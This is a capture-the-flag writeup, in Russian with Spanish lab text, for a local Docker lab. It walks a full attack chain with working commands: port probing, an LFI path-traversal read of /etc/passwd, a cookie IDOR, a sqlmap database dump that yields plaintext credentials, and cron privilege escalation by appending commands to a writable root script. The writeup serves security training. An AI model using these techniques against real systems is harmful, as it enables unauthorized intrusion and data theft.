# Lab 4 — Operación Nexus | Writeup

**CTF:** PawnGuard Labs  
**Dificultad:** Hard  
**Categoría:** Vulnerable System  
**Flags:** 5/5

---

## Reconnaissance

Docker-контейнер поднимает три сервиса:
- `80` — Apache/PHP веб-сервер
- `2222` → 22 — SSH
- `13337` — скрытый сервис

---

## Парт 1 — Скрытый порт (Flag 1)

### Сканирование

```bash
gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

```
index.php   (Status: 302) [--> /?file=inicio.txt]
panel.php   (Status: 200) [Size: 119]
users.txt   (Status: 200) [Size: 123]
```

Нестандартный порт `13337` — подключаемся напрямую:

```bash
nc localhost 13337
```

**Флаг:** получается при прямом подключении к порту 13337

---

## Парт 2  IDOR через Cookie (Flag 2)

### Разведка users.txt

```bash
curl http://localhost/users.txt
```

```
[REGISTRO DEL SISTEMA]
Usuario: operador | ID_Sesion: 2
Usuario: invitado | ID_Sesion: 3
Usuario: admin    | ID_Sesion: 10
```

### LFI чтение /etc/passwd

```bash
curl "http://localhost/?file=../../../etc/passwd"
```

```html
<h1>Sistema de Comando y Control</h1><h3>Directorio de inicio</h3>
root:x:0:0:root:/root:/bin/bash
...
sysadmin:x:1000:1000::/home/sysadmin:/bin/bash

<!-- Un archivo puede tener informacion de usuarios en el sistema... -->
<!-- El siguiente paso sera pasar al panel '/panel.php' -->
```

### panel.php доступ запрещён

```bash
curl -v http://localhost/panel.php
```

```html
<h2>Acceso Denegado</h2>
<p>Solo el administrador del sistema puede ver los registros. Tu ID de sesión actual es: 2</p>
```

### IDOR  меняем Cookie id=2 → id=10

```bash
curl -b "id=10" http://localhost/panel.php
```

```html
<!-- PWG{ID0R_S3ssi0n_Byp4ss_M4st3r} -->
<h2>Panel de Administración (ID: 10)</h2>
<p>Bienvenido. Buscador de bitácoras del sistema activado.</p>
<form method="POST" action="/panel.php">
  Buscar en bitácora: <input type="text" name="search" placeholder="ej. inicio">
  <input type="submit" value="Buscar">
</form>
<!-- ssh -->
```

**Флаг:** `PWG{ID0R_S3ssi0n_Byp4ss_M4st3r}`

---

## Парт 3 SQLite UNION Injection (Flag 3)

### Проверка инъекции

```bash
curl -b "id=10" -X POST http://localhost/panel.php --data "search='"
```

```html
<p style='color:red;'>Error SQL: SQLSTATE[HY000]: General error: 1 unrecognized token: "'"</p>
```

### sqlmap  обнаружение

```bash
sqlmap -u "http://localhost/panel.php" \
  --cookie="id=10" \
  --data="search=test" \
  --method=POST \
  --tables --batch
```

```
[*] starting @ 18:31:53

[INFO] resuming back-end DBMS 'sqlite'
back-end DBMS: SQLite

[3 tables]
+------------------+
| bitacora         |
| secretos         |
| usuarios_sistema |
+------------------+
```

### sqlmap  дамп таблиц

```bash
sqlmap -u "http://localhost/panel.php" \
  --cookie="id=10" \
  --data="search=test" \
  --method=POST \
  --dump --batch
```

```
Table: secretos
+----+-------------------------------+------------------+
| id | flag                          | descripcion      |
+----+-------------------------------+------------------+
| 1  | PWG{SQLi_Un10n_Byp4ss_M4st3r} | Flag_3_Protegida |
+----+-------------------------------+------------------+

Table: usuarios_sistema
+----+-----------------------+----------+
| id | password              | username |
+----+-----------------------+----------+
| 1  | P4ssw0rd_Super_S3gur4 | sysadmin |
+----+-----------------------+----------+

Table: bitacora
+----+------------+-------------------------------+
| id | fecha      | log_message                   |
+----+------------+-------------------------------+
| 1  | 2026-05-01 | Sistema iniciado              |
| 2  | 2026-05-02 | Login fallido desde IP remota |
+----+------------+-------------------------------+
```

**Флаг:** `PWG{SQLi_Un10n_Byp4ss_M4st3r}`  
**Credentials SSH:** `sysadmin : P4ssw0rd_Super_S3gur4`

---

## Парт 4 Стеганография + Base64 (Flag 4)

### SSH вход

```bash
ssh sysadmin@localhost -p 2222
# входим по паролю который нашел sqlmap: P4ssw0rd_Super_S3gur4
```

### Разведка домашней директории

```bash
ls -la ~
```

```
total 40
drwx------ 1 sysadmin sysadmin  4096 May  9 19:32 .
drwxr-xr-x 1 root     root      4096 May  9 19:32 ..
-rw-r--r-- 1 sysadmin sysadmin   220 Mar  8 15:21 .bash_logout
-rw-r--r-- 1 sysadmin sysadmin  3526 Mar  8 15:21 .bashrc
-rw-r--r-- 1 sysadmin sysadmin   807 Mar  8 15:21 .profile
-rw-r--r-- 1 sysadmin sysadmin 16394 May  9 19:32 mycat.jpg
```

### Извлечение строк из изображения

```bash
strings ~/mycat.jpg | tail -20
```

```
Z[/E
 !1@
A"PQ2
...
UFdHe1MzYXJjaF9XMXRoX1N0cjFuZ3N9Cg==
```

### Декодирование Base64

```bash
echo "UFdHe1MzYXJjaF9XMXRoX1N0cjFuZ3N9Cg==" | base64 -d
```

```
PWG{S3arch_W1th_Str1ngs}
```

**Флаг:** `PWG{S3arch_W1th_Str1ngs}`

---

## Парт 5 Privilege Escalation via Cron (Flag 5)

### Разведка crontab

```bash
cat /etc/crontab
```

```
* * * * * root /opt/mantenimiento.sh
```

### Проверка прав на скрипт

```bash
find / -path /proc -prune -o -writable -type f -print 2>/dev/null | grep -v "/tmp\|/dev"
```

```
/home/sysadmin/.bash_logout
/home/sysadmin/.bashrc
/home/sysadmin/.profile
/home/sysadmin/mycat.jpg
/opt/mantenimiento.sh
```

```bash
cat /opt/mantenimiento.sh
```

```bash
#!/bin/bash
# Script de mantenimiento automatico
echo "Mantenimiento completado" > /tmp/mantenimiento.log
```

### Эксплуатация — запись в скрипт

```bash
echo "cat /root/FINAL.txt > /tmp/flag.txt && chmod 777 /tmp/flag.txt" >> /opt/mantenimiento.sh
```

### Ждём выполнения cron (1 минута)

```bash
sleep 60 && cat /tmp/flag.txt
```

```
UFdHe0MwbmdyNHRzX1kwdV9BcjNfUjAwdF9NNHN0M3J9Cg==
```

### Декодируем

```bash
echo "UFdHe0MwbmdyNHRzX1kwdV9BcjNfUjAwdF9NNHN0M3J9Cg==" | base64 -d
```

```
PWG{C0ngr4ts_Y0u_Ar3_R00t_M4st3r}
```

**Флаг:** `PWG{C0ngr4ts_Y0u_Ar3_R00t_M4st3r}`

---


Лаборатория охватывает классическую цепочку атак:

1. **Reconnaissance** → обнаружение скрытых сервисов и директорий
2. **LFI** → чтение системных файлов через уязвимый параметр
3. **IDOR** → обход авторизации через манипуляцию Cookie
4. **SQLi** → извлечение данных из SQLite базы
5. **Steganography** → нахождение данных в бинарных файлах
6. **Cron Privesc** → эскалация привилегий через записываемый cron скрипт
